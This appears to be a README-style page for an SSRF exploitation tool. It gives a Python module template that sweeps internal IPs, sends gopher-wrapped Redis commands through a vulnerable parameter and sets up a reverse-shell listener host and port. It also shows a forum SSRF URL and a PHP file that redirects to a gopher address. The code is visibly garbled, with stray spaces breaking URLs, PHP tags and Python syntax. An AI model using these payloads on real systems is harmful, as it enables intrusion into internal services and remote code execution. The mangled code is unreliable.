# SSRF MAP
![Capture](https://user-images.githubusercontent.com/25066959/70392990-83d77f80-19b3-11ea-8468-a9d7dbf246b2.PNG)    

![Capture](https://user-images.githubusercontent.com/25066959/70393005-a10c4e00-19b3-11ea-8128-0655869f3202.PNG)   

Use the template to change the script:   
```
from core.utils import *

import logging

 

name           = "servicename inlowercase"

description    = "ServiceName RCE-What does itdo"

author         = "Name or pseudo of theauthor"

documentation = ["http: // link_to_a_research", "http: // another_link" ]

 

class exploit ():

    SERVER_HOST = "127.0.0.1"

    SERVER_PORT = "4242"

 

    def __init __ (self , requester, args):

        logging .info ("Module '{}' launched!". format (name))

 

        # Handle args for reverse shell

        if args.lhost == None: self.SERVER_HOST = input ("Server Host:" )

        else : self.SERVER_HOST = args. lhost

 

        if args.lport == None: self.SERVER_PORT = input ("Server Port:" )

        else : self.SERVER_PORT = args. lport

 

        # Data for the service

        # Using a generator to create the hostlist

        # Edit the following ip if you need to target something else 

        gen_host = gen_ip_list ("127.0.0.1", args. Level)

        for ip in gen_host:

            port = "6379"

            data = "* 1% 0d% 0a $ 8% 0d% 0aflus [...]% 0aquit% 0d% 0a"

            payload = wrapper_gopher (data, ip, port)

 

            # Handle args for reverse shell 

            payload = payload.replace ("SERVER_HOST", self. SERVER_HOST)

            payload = payload.replace ("SERVER_PORT", self. SERVER_PORT)

 

            # Send the payload 

            r = requester.do_request (args.param, payload)
```

### DZ EXample 
![Capture](https://user-images.githubusercontent.com/25066959/70393022-ce58fc00-19b3-11ea-8287-3f3bb5b00864.PNG)

Which leads to this: 

`http: // 127.0.0.1:8899/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2fgopher.php%3Fa.jpg%5B % `2fimg% 5D

gopher.php    
```php
<? php
 header ("Location: gopher: //127.0.0.1: 2333 / _test" );
 ?>
 ```   